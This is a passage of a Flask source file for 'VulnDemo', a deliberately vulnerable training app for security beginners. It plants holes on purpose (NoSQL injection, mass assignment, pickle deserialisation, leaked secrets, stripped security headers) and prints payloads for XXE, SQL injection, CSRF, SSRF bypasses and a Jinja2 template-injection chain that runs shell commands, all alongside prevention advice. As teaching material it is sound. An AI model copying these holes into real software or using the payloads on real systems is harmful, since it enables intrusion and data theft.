            <h2>XML Parser <span class="badge badge-advanced">XXE - Advanced</span></h2>
            <form method="POST">
                <label>XML Data:</label>
                <textarea name="xml" rows="8" placeholder="&lt;root&gt;&lt;data&gt;test&lt;/data&gt;&lt;/root&gt;"></textarea>
                <button type="submit">Parse XML</button>
            </form>

            {"<div class='result'><pre>" + result + "</pre></div>" if result else ""}
            {"<div class='result error'>" + error + "</div>" if error else ""}

            <div class="result">
                <h4>XXE Payloads:</h4>
                <pre>&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [
  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;root&gt;&amp;xxe;&lt;/root&gt;</pre>
            </div>
        </div>
        '''
        template = BASE_TEMPLATE.replace('{% block content %}{% endblock %}', content)
        return render_template_string(template, title='XXE')

    # ==================== NoSQL INJECTION (HARD) ====================

    @app.route('/nosql', methods=['GET', 'POST'])
    def nosql_injection():
        result = None

        if request.method == 'POST':
            username = request.form.get('username', '')
            password = request.form.get('password', '')

            # Simulated MongoDB-style query (vulnerable)
            # In real app would be: db.users.find({'username': username, 'password': password})
            # VULNERABLE: NoSQL injection via JSON
            try:
                query = json.loads(f'{{"username": "{username}", "password": "{password}"}}')

                # Simulate: if query matches pattern like {"$ne": ""} it bypasses auth
                if isinstance(query.get('username'), dict) or isinstance(query.get('password'), dict):
                    result = "NoSQL Injection detected! Would bypass authentication in real MongoDB."
                else:
                    result = f"Query executed: {query}"
            except:
                result = f"Query: username={username}, password={password}"

        content = f'''
        <div class="card">
            <h2>NoSQL Login <span class="badge badge-hard">NoSQL Injection - Hard</span></h2>
            <form method="POST">
                <label>Username:</label>
                <input type="text" name="username" placeholder="admin">
                <label>Password:</label>
                <input type="text" name="password" placeholder="password">
                <button type="submit">Login</button>
            </form>

            {"<div class='result'>" + result + "</div>" if result else ""}

            <div class="result">
                <h4>NoSQL Injection Payloads:</h4>
                <ul class="vuln-list">
                    <li>Username: <code>admin</code>, Password: <code>{{"$ne": ""}}</code></li>
                    <li>Username: <code>{{"$gt": ""}}</code>, Password: <code>{{"$gt": ""}}</code></li>
                    <li><code>{{"$regex": "^a"}}</code> - Regex injection</li>
                </ul>
            </div>
        </div>
        '''
        template = BASE_TEMPLATE.replace('{% block content %}{% endblock %}', content)
        return render_template_string(template, title='NoSQL Injection')

    # ==================== MASS ASSIGNMENT (HARD) ====================

    @app.route('/mass-assign', methods=['GET', 'POST'])
    def mass_assignment():
        result = None

        if request.method == 'POST':
            # VULNERABLE: Mass assignment - accepts all parameters
            user_data = {
                'username': request.form.get('username', ''),
                'email': request.form.get('email', ''),
                # Hidden but accepted parameters:
                'role': request.form.get('role', 'user'),
                'is_admin': request.form.get('is_admin', '0'),
                'api_key': request.form.get('api_key', '')
            }
            result = f"User updated with: {json.dumps(user_data, indent=2)}"

        content = f'''
        <div class="card">
            <h2>User Registration <span class="badge badge-hard">Mass Assignment - Hard</span></h2>
            <form method="POST">
                <label>Username:</label>
                <input type="text" name="username" placeholder="username">
                <label>Email:</label>
                <input type="email" name="email" placeholder="email@example.com">
                <!-- Hidden from UI but accepted by server -->
                <button type="submit">Register</button>
            </form>

            {"<div class='result'><pre>" + result + "</pre></div>" if result else ""}

            <div class="result">
                <h4>Mass Assignment Exploit:</h4>
                <p>Add hidden parameters to the form:</p>
                <ul class="vuln-list">
                    <li><code>role=admin</code> - Elevate to admin</li>
                    <li><code>is_admin=1</code> - Grant admin flag</li>
                    <li><code>api_key=custom_key</code> - Set custom API key</li>
                </ul>
                <p>Via curl: <code>curl -X POST -d "username=test&email=t@t.com&role=admin&is_admin=1" ...</code></p>
            </div>
        </div>
        '''
        template = BASE_TEMPLATE.replace('{% block content %}{% endblock %}', content)
        return render_template_string(template, title='Mass Assignment')

    # ==================== HTTP PARAMETER POLLUTION ====================

    @app.route('/hpp')
    def http_param_pollution():
        # VULNERABLE: HPP - takes last value without validation
        user_id = request.args.get('id', '')
        action = request.args.get('action', '')

        # Also check for duplicate parameters
        all_ids = request.args.getlist('id')

        content = f'''
        <div class="card">
            <h2>HPP Test <span class="badge badge-hard">HTTP Parameter Pollution - Hard</span></h2>
            <p>Received ID: {user_id}</p>
            <p>All IDs: {all_ids}</p>
            <p>Action: {action}</p>

            <div class="result">
                <h4>HPP Examples:</h4>
                <code>?id=1&id=2</code> - Multiple values<br>
                <code>?action=view&action=delete</code> - Override actions
            </div>
        </div>
        '''
        template = BASE_TEMPLATE.replace('{% block content %}{% endblock %}', content)
        return render_template_string(template, title='HPP')

    # ==================== INFO DISCLOSURE (EASY) ====================

    @app.route('/admin')
    def admin():
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT username, email, api_key, role FROM users")
        users = c.fetchall()
        conn.close()

        users_html = '\n'.join([f'<tr><td>{u[0]}</td><td>{u[1]}</td><td>{u[2]}</td><td>{u[3]}</td></tr>' for u in users])

        content = f'''
        <div class="card">
            <h2>Admin Panel <span class="badge">Info Disclosure - Easy</span></h2>
            <pre>
Database: {DB_PATH}
Secret Key: {app.secret_key}
JWT Secret: {JWT_SECRET}
Debug Mode: True
Python Version: 3.x
            </pre>

            <h3>All Users (with API keys!)</h3>
            <table>
                <tr><th>Username</th><th>Email</th><th>API Key</th><th>Role</th></tr>
                {users_html}
            </table>
        </div>
        '''
        template = BASE_TEMPLATE.replace('{% block content %}{% endblock %}', content)
        return render_template_string(template, title='Admin')

    # ==================== SENSITIVE FILES ====================

    @app.route('/backup.sql')
    def backup_sql():
        return '''-- Database Backup
CREATE TABLE users (id INT, username VARCHAR(50), password VARCHAR(50), email VARCHAR(100), api_key VARCHAR(100));
INSERT INTO users VALUES (1, 'admin', 'admin123', 'admin@vulndemo.local', 'ak_admin_secret_key_12345');
INSERT INTO users VALUES (2, 'user', 'password', 'user@vulndemo.local', 'ak_user_key_67890');
'''

    @app.route('/.env')
    def env_file():
        return '''DATABASE_URL=postgres://admin:secretpass@localhost/production
SECRET_KEY=super_secret_production_key_12345
JWT_SECRET=secret123
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
STRIPE_API_KEY=sk_live_1234567890abcdef
OPENAI_API_KEY=sk-1234567890abcdef
'''

    @app.route('/.git/config')
    def git_config():
        return '''[core]
    repositoryformatversion = 0
    filemode = true
[remote "origin"]
    url = https://github.com/company/private-repo.git
    fetch = +refs/heads/*:refs/remotes/origin/*
[user]
    name = Admin
    email = admin@vulndemo.local
'''

    @app.route('/debug.log')
    def debug_log():
        return f'''[2024-01-15 10:23:45] DEBUG: Database connection: {DB_PATH}
[2024-01-15 10:23:46] DEBUG: User admin logged in from 192.168.1.100
[2024-01-15 10:23:47] DEBUG: API Key used: ak_admin_secret_key_12345
[2024-01-15 10:24:00] ERROR: SQL Query failed: SELECT * FROM users WHERE id = '1' OR '1'='1'
[2024-01-15 10:24:15] DEBUG: Session secret: {app.secret_key}
'''

    @app.route('/api/config')
    def api_config():
        return jsonify({
            'database': DB_PATH,
            'debug': True,
            'secret_key': app.secret_key,
            'jwt_secret': JWT_SECRET,
            'allowed_hosts': ['*'],
            'cors_origins': ['*']
        })

    @app.route('/robots.txt')
    def robots():
        return '''User-agent: *
Disallow: /admin
Disallow: /backup.sql
Disallow: /.env
Disallow: /.git/
Disallow: /api/config
Disallow: /debug.log
Disallow: /admin/feedback
'''

    # ==================== VULNERABILITY EDUCATION PAGE ====================

    @app.route('/learn')
    def vulnerability_education():
        """Educational page explaining all vulnerabilities for interns and beginners."""
        content = '''
        <div class="card">
            <h1>Vulnerability Education Center</h1>
            <p>This page explains each vulnerability type in detail. Perfect for security interns and beginners!</p>
        </div>

        <!-- XSS Section -->
        <div class="card" id="xss">
            <h2>Cross-Site Scripting (XSS)</h2>
            <div class="vuln-info">
                <p><strong>CWE-79</strong> | <strong>OWASP Top 10: A03:2021</strong></p>

                <h4>What is it?</h4>
                <p>XSS occurs when an attacker injects malicious scripts into web pages viewed by other users. The victim's browser executes the script, thinking it's from a trusted source.</p>

                <h4>Types of XSS:</h4>
                <ul class="vuln-list">
                    <li><strong>Reflected XSS:</strong> Malicious script comes from the current HTTP request (e.g., URL parameter)</li>
                    <li><strong>Stored XSS:</strong> Malicious script is stored on the server (e.g., database) and served to victims later</li>
                    <li><strong>DOM-based XSS:</strong> Vulnerability exists in client-side JavaScript, not server-side code</li>
                </ul>

                <h4>Why is it dangerous?</h4>
                <ul class="vuln-list">
                    <li>Session hijacking (steal cookies)</li>
                    <li>Account takeover</li>
                    <li>Keylogging user input</li>
                    <li>Phishing attacks</li>
                    <li>Malware distribution</li>
                </ul>

                <h4>Example Vulnerable Code (Python/Flask):</h4>
                <pre><code># BAD - Directly embedding user input
@app.route('/search')
def search():
    query = request.args.get('q', '')
    return f"Results for: {query}"  # VULNERABLE!

# GOOD - Use proper templating with auto-escaping
@app.route('/search')
def search():
    query = request.args.get('q', '')
    return render_template('search.html', query=query)  # Jinja2 auto-escapes</code></pre>

                <h4>How to Prevent:</h4>
                <ul class="vuln-list">
                    <li>Use templating engines that auto-escape output (Jinja2, React, Angular)</li>
                    <li>Implement Content Security Policy (CSP) headers</li>
                    <li>Validate and sanitize all user input</li>
                    <li>Use HttpOnly cookies to prevent session theft</li>
                    <li>Encode output based on context (HTML, JavaScript, CSS, URL)</li>
                </ul>
            </div>
        </div>

        <!-- SQL Injection Section -->
        <div class="card" id="sqli">
            <h2>SQL Injection (SQLi)</h2>
            <div class="vuln-info">
                <p><strong>CWE-89</strong> | <strong>OWASP Top 10: A03:2021</strong></p>

                <h4>What is it?</h4>
                <p>SQL injection occurs when user input is included in SQL queries without proper sanitization. Attackers can manipulate the query to access, modify, or delete data they shouldn't have access to.</p>

                <h4>Types of SQL Injection:</h4>
                <ul class="vuln-list">
                    <li><strong>In-band SQLi:</strong> Results are returned in the same response (Union-based, Error-based)</li>
                    <li><strong>Blind SQLi:</strong> No direct output; infer results via timing or boolean responses</li>
                    <li><strong>Out-of-band SQLi:</strong> Data is exfiltrated via different channel (DNS, HTTP)</li>
                    <li><strong>Second-order SQLi:</strong> Malicious input is stored and executed later in a different context</li>
                </ul>

                <h4>Example Vulnerable Code:</h4>
                <pre><code># BAD - String concatenation with user input
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
cursor.execute(query)  # VULNERABLE!

# GOOD - Use parameterized queries (prepared statements)
query = "SELECT * FROM users WHERE username = ? AND password = ?"
cursor.execute(query, (username, password))  # SAFE!</code></pre>

                <h4>Common Payloads:</h4>
                <pre><code>' OR '1'='1' --        # Bypass login
' UNION SELECT 1,2,3--  # Extract data
'; DROP TABLE users;--  # Destructive
1 AND SLEEP(5)--        # Time-based blind</code></pre>

                <h4>How to Prevent:</h4>
                <ul class="vuln-list">
                    <li><strong>Always</strong> use parameterized queries / prepared statements</li>
                    <li>Use ORMs (SQLAlchemy, Django ORM) which handle escaping</li>
                    <li>Implement input validation (whitelist approach)</li>
                    <li>Apply least privilege to database accounts</li>
                    <li>Use stored procedures with parameterized calls</li>
                </ul>
            </div>
        </div>

        <!-- CSRF Section -->
        <div class="card" id="csrf">
            <h2>Cross-Site Request Forgery (CSRF)</h2>
            <div class="vuln-info">
                <p><strong>CWE-352</strong> | <strong>OWASP Top 10: A01:2021</strong></p>

                <h4>What is it?</h4>
                <p>CSRF tricks authenticated users into performing unintended actions on a web application. The attacker exploits the browser's automatic inclusion of session cookies with requests.</p>

                <h4>How it Works:</h4>
                <ol>
                    <li>User logs into vulnerable site (e.g., bank.com)</li>
                    <li>User visits attacker's site while still logged in</li>
                    <li>Attacker's site submits a form to bank.com</li>
                    <li>Browser includes user's session cookie automatically</li>
                    <li>Bank processes the request as if the user initiated it</li>
                </ol>

                <h4>Example Attack:</h4>
                <pre><code>&lt;!-- On attacker's page --&gt;
&lt;form action="https://bank.com/transfer" method="POST" id="evil-form"&gt;
    &lt;input type="hidden" name="to" value="attacker_account" /&gt;
    &lt;input type="hidden" name="amount" value="10000" /&gt;
&lt;/form&gt;
&lt;script&gt;document.getElementById('evil-form').submit();&lt;/script&gt;</code></pre>

                <h4>How to Prevent:</h4>
                <ul class="vuln-list">
                    <li>Include CSRF tokens in all state-changing forms</li>
                    <li>Use SameSite cookie attribute (SameSite=Strict or Lax)</li>
                    <li>Verify Origin/Referer headers</li>
                    <li>Require re-authentication for sensitive actions</li>
                    <li>Use CAPTCHA for critical operations</li>
                </ul>
            </div>
        </div>

        <!-- IDOR Section -->
        <div class="card" id="idor">
            <h2>Insecure Direct Object Reference (IDOR)</h2>
            <div class="vuln-info">
                <p><strong>CWE-639</strong> | <strong>OWASP Top 10: A01:2021</strong></p>

                <h4>What is it?</h4>
                <p>IDOR occurs when an application provides direct access to objects based on user-supplied input without proper authorization checks. Attackers can access other users' data by changing IDs.</p>

                <h4>Example:</h4>
                <pre><code># VULNERABLE endpoint - no authorization check
GET /api/user/123  → Returns user 123's data
GET /api/user/124  → Returns user 124's data (different user!)

# What the code looks like:
@app.route('/api/user/&lt;int:id&gt;')
def get_user(id):
    return User.query.get(id).to_json()  # No auth check!</code></pre>

                <h4>Secure Version:</h4>
                <pre><code>@app.route('/api/user/&lt;int:id&gt;')
@login_required
def get_user(id):
    user = User.query.get(id)
    if user.id != current_user.id and not current_user.is_admin:
        abort(403)  # Forbidden
    return user.to_json()</code></pre>

                <h4>How to Prevent:</h4>
                <ul class="vuln-list">
                    <li>Implement access control checks on every request</li>
                    <li>Use indirect references (random tokens instead of IDs)</li>
                    <li>Verify user owns the resource before returning it</li>
                    <li>Use UUIDs instead of sequential integers</li>
                    <li>Implement proper authorization middleware</li>
                </ul>
            </div>
        </div>

        <!-- JWT Section -->
        <div class="card" id="jwt">
            <h2>JWT (JSON Web Token) Vulnerabilities</h2>
            <div class="vuln-info">
                <p><strong>CWE-347</strong> | <strong>OWASP Top 10: A02:2021</strong></p>

                <h4>What is JWT?</h4>
                <p>JWT is a compact, URL-safe token format used for authentication. It consists of three parts: Header, Payload, and Signature (separated by dots).</p>

                <pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.  # Header (base64)
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4ifQ.  # Payload (base64)
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c  # Signature</code></pre>

                <h4>Common Vulnerabilities:</h4>
                <ul class="vuln-list">
                    <li><strong>Weak Secret:</strong> Secret like "secret123" can be brute-forced</li>
                    <li><strong>Algorithm None:</strong> Setting alg to "none" bypasses signature verification</li>
                    <li><strong>Algorithm Confusion:</strong> Switching from RS256 to HS256</li>
                    <li><strong>Missing Expiration:</strong> Tokens without exp claim never expire</li>
                    <li><strong>Sensitive Data:</strong> Storing passwords/secrets in payload (base64 is NOT encryption!)</li>
                </ul>

                <h4>How to Prevent:</h4>
                <pre><code># Use strong secrets (256+ bits of entropy)
import secrets
JWT_SECRET = secrets.token_hex(32)  # 64 hex chars

# Always validate algorithm server-side
jwt.decode(token, SECRET, algorithms=['HS256'])  # Whitelist!

# Always set expiration
payload = {
    'user_id': 123,
    'exp': datetime.utcnow() + timedelta(hours=1),  # Expires in 1 hour
    'iat': datetime.utcnow()  # Issued at
}</code></pre>
            </div>
        </div>

        <!-- SSRF Section -->
        <div class="card" id="ssrf">
            <h2>Server-Side Request Forgery (SSRF)</h2>
            <div class="vuln-info">
                <p><strong>CWE-918</strong> | <strong>OWASP Top 10: A10:2021</strong></p>

                <h4>What is it?</h4>
                <p>SSRF allows attackers to make the server perform requests on their behalf, potentially accessing internal services, cloud metadata endpoints, or other protected resources.</p>

                <h4>Why is it Dangerous?</h4>
                <ul class="vuln-list">
                    <li>Access internal services not exposed to the internet</li>
                    <li>Retrieve cloud metadata (AWS: 169.254.169.254)</li>
                    <li>Port scanning internal networks</li>
                    <li>Read local files via file:// protocol</li>
                    <li>Bypass firewalls and access controls</li>
                </ul>

                <h4>Bypass Techniques:</h4>
                <pre><code># IP obfuscation
127.0.0.1 → 2130706433 (decimal)
127.0.0.1 → 0x7f.0x0.0x0.0x1 (hex)
127.0.0.1 → 127.1 (short form)
127.0.0.1 → [::1] (IPv6)

# Protocol bypass
file:///etc/passwd
gopher://internal-service:25/

# DNS rebinding
attacker.com → resolves to 127.0.0.1</code></pre>

                <h4>How to Prevent:</h4>
                <ul class="vuln-list">
                    <li>Whitelist allowed URLs/domains</li>
                    <li>Block private IP ranges (10.x, 172.16.x, 192.168.x, 127.x)</li>
                    <li>Disable unnecessary URL schemes (file://, gopher://)</li>
                    <li>Use network segmentation</li>
                    <li>Implement proper egress filtering</li>
                </ul>
            </div>
        </div>

        <!-- SSTI Section -->
        <div class="card" id="ssti">
            <h2>Server-Side Template Injection (SSTI)</h2>
            <div class="vuln-info">
                <p><strong>CWE-1336</strong> | <strong>OWASP Top 10: A03:2021</strong></p>

                <h4>What is it?</h4>
                <p>SSTI occurs when user input is embedded into server-side templates and executed. This can lead to Remote Code Execution (RCE) on the server.</p>

                <h4>Example (Jinja2):</h4>
                <pre><code># VULNERABLE
template = f"Hello, {user_input}!"
render_template_string(template)

# If user_input = "{{7*7}}" → Output: "Hello, 49!"
# If user_input = "{{config}}" → Dumps Flask config!</code></pre>

                <h4>Exploitation Chain (Jinja2 RCE):</h4>
                <pre><code># Step 1: Confirm injection
{{7*7}}  # Returns 49

# Step 2: Access classes
{{''.__class__.__mro__}}  # String's class hierarchy

# Step 3: Find subprocess
{{''.__class__.__mro__[1].__subclasses__()}}  # All classes

# Step 4: Execute code
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}</code></pre>

                <h4>How to Prevent:</h4>
                <ul class="vuln-list">
                    <li>Never embed user input directly in templates</li>
                    <li>Use template engines in sandboxed mode</li>
                    <li>Prefer logic-less templates (Mustache)</li>
                    <li>Validate and sanitize all input</li>
                </ul>
            </div>
        </div>

        <!-- Race Condition Section -->
        <div class="card" id="race">
            <h2>Race Conditions</h2>
            <div class="vuln-info">
                <p><strong>CWE-362</strong> | <strong>OWASP Top 10: A04:2021</strong></p>

                <h4>What is it?</h4>
                <p>Race conditions occur when the behavior of code depends on the timing of events. In web applications, this typically happens when multiple requests can modify shared state simultaneously.</p>

                <h4>Example: Double Spending</h4>
                <pre><code># VULNERABLE code
def withdraw(amount):
    balance = get_balance()  # Step 1: Check
    if balance >= amount:
        time.sleep(0.1)  # Simulated processing
        set_balance(balance - amount)  # Step 2: Update
        return "Success"
    return "Insufficient funds"

# Attack: Send 10 requests simultaneously for $100
# All 10 might pass the balance check before any update!</code></pre>

                <h4>How to Prevent:</h4>
                <ul class="vuln-list">
                    <li>Use database transactions with proper isolation levels</li>
                    <li>Implement row-level locking (SELECT ... FOR UPDATE)</li>
                    <li>Use atomic operations (UPDATE ... WHERE balance >= amount)</li>
                    <li>Implement idempotency tokens</li>
                    <li>Use distributed locks for microservices</li>
                </ul>
            </div>
        </div>

        <!-- Mass Assignment Section -->
        <div class="card" id="mass-assign">
            <h2>Mass Assignment</h2>
            <div class="vuln-info">
                <p><strong>CWE-915</strong> | <strong>OWASP Top 10: A04:2021</strong></p>

                <h4>What is it?</h4>
                <p>Mass assignment occurs when an application binds user-supplied data directly to model objects without filtering. Attackers can modify fields they shouldn't have access to.</p>

                <h4>Example:</h4>
                <pre><code># VULNERABLE - accepts all form fields
@app.route('/register', methods=['POST'])
def register():
    user = User(**request.form)  # ALL fields bound!
    db.session.add(user)
    return "Registered"

# Attacker adds: role=admin&is_admin=1 to form
# Now they have admin privileges!</code></pre>

                <h4>Secure Version:</h4>
                <pre><code># Whitelist allowed fields
ALLOWED_FIELDS = ['username', 'email', 'password']

@app.route('/register', methods=['POST'])
def register():
    data = {k: v for k, v in request.form.items() if k in ALLOWED_FIELDS}
    user = User(**data)
    db.session.add(user)</code></pre>

                <h4>How to Prevent:</h4>
                <ul class="vuln-list">
                    <li>Whitelist allowed parameters explicitly</li>
                    <li>Use DTOs (Data Transfer Objects) / Forms</li>
                    <li>Mark sensitive fields as non-assignable</li>
                    <li>Use serializers with explicit field lists</li>
                </ul>
            </div>
        </div>

        <!-- XXE Section -->
        <div class="card" id="xxe">
            <h2>XML External Entity (XXE)</h2>
            <div class="vuln-info">
                <p><strong>CWE-611</strong> | <strong>OWASP Top 10: A05:2021</strong></p>

                <h4>What is it?</h4>
                <p>XXE exploits vulnerable XML parsers that process external entity references. Attackers can read local files, perform SSRF, or cause denial of service.</p>

                <h4>Attack Payload:</h4>
                <pre><code>&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [
  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;root&gt;
  &lt;data&gt;&amp;xxe;&lt;/data&gt;
&lt;/root&gt;</code></pre>

                <h4>How to Prevent:</h4>
                <pre><code># Python - defusedxml library
from defusedxml.ElementTree import parse
tree = parse('data.xml')  # Safe!

# Or disable external entities
parser = ET.XMLParser(resolve_entities=False)

# Best: Use JSON instead of XML when possible!</code></pre>
            </div>
        </div>

        <div class="card">
            <h2>Additional Resources</h2>
            <ul class="vuln-list">
                <li><a href="https://owasp.org/Top10/" style="color: #00ff88;">OWASP Top 10</a> - Most critical web vulnerabilities</li>
                <li><a href="https://portswigger.net/web-security" style="color: #00ff88;">PortSwigger Web Security Academy</a> - Free training</li>
                <li><a href="https://cwe.mitre.org/" style="color: #00ff88;">CWE Database</a> - Common Weakness Enumeration</li>
                <li><a href="https://cheatsheetseries.owasp.org/" style="color: #00ff88;">OWASP Cheat Sheets</a> - Prevention guides</li>
                <li><a href="https://hackerone.com/hacktivity" style="color: #00ff88;">HackerOne Hacktivity</a> - Real vulnerability reports</li>
            </ul>
        </div>

        <style>
            .vuln-info { line-height: 1.8; }
            .vuln-info h4 { color: #00ff88; margin-top: 20px; margin-bottom: 10px; }
            .vuln-info p { margin-bottom: 12px; }
            .vuln-info pre { margin: 16px 0; }
            .vuln-info ol { margin-left: 20px; }
            .vuln-info ol li { padding: 4px 0; }
        </style>
        '''
        template = BASE_TEMPLATE.replace('{% block content %}{% endblock %}', content)
        return render_template_string(template, title='Learn Vulnerabilities')

    # ==================== MISSING SECURITY HEADERS ====================

    @app.after_request
    def remove_security_headers(response):
        # VULNERABLE: Remove/omit all security headers
        response.headers.pop('X-Content-Type-Options', None)
        response.headers.pop('X-Frame-Options', None)
        response.headers.pop('X-XSS-Protection', None)
        response.headers.pop('Content-Security-Policy', None)
        response.headers.pop('Strict-Transport-Security', None)
        response.headers.pop('Referrer-Policy', None)
        response.headers.pop('Permissions-Policy', None)

        # Expose server information
        response.headers['Server'] = 'Apache/2.4.29 (Ubuntu)'
        response.headers['X-Powered-By'] = 'PHP/7.2.10'
        response.headers['X-AspNet-Version'] = '4.0.30319'

        # Set insecure cookies
        response.set_cookie('session_id', 'demo_session_abc123',
                          httponly=False, secure=False, samesite=None)
        response.set_cookie('user_prefs', 'theme=dark',
                          httponly=False, secure=False)

        return response

    # ==================== INSECURE DESERIALIZATION INDICATOR ====================

    @app.route('/deserialize', methods=['POST'])
    def insecure_deserialize():
        data = request.form.get('data', '')
        result = None

        if data:
            try:
                # VULNERABLE: Pickle deserialization
                decoded = base64.b64decode(data)
                obj = pickle.loads(decoded)  # DANGEROUS
                result = f"Deserialized: {obj}"
            except Exception as e:
                result = f"Error: {e}"

        return jsonify({'result': result})

    return app


if __name__ == '__main__':
    app = create_vulnerable_app()
    print("""
    ╔════════════════════════════════════════════════════════════════════╗
    ║   VulnDemo ADVANCED - Intentionally Vulnerable Application         ║
    ║                                                                    ║
    ║   Contains 20+ vulnerability types including:                      ║
    ║   - DOM XSS, Blind XSS, Stored XSS                                ║
    ║   - Blind SQLi, Second-order SQLi                                 ║
    ║   - SSRF, SSTI, IDOR, JWT vulnerabilities                         ║
    ║   - Race conditions, XXE, Mass Assignment                         ║
    ║   - NoSQL Injection, Prototype Pollution indicators               ║
    ║                                                                    ║
    ║   WARNING: For testing purposes only!                              ║
    ║   DO NOT deploy in production!                                     ║
    ║                                                                    ║
    ║   Running at: http://localhost:5001                                ║
    ╚════════════════════════════════════════════════════════════════════╝
    """)
    app.run(host='127.0.0.1', port=5001, debug=True)
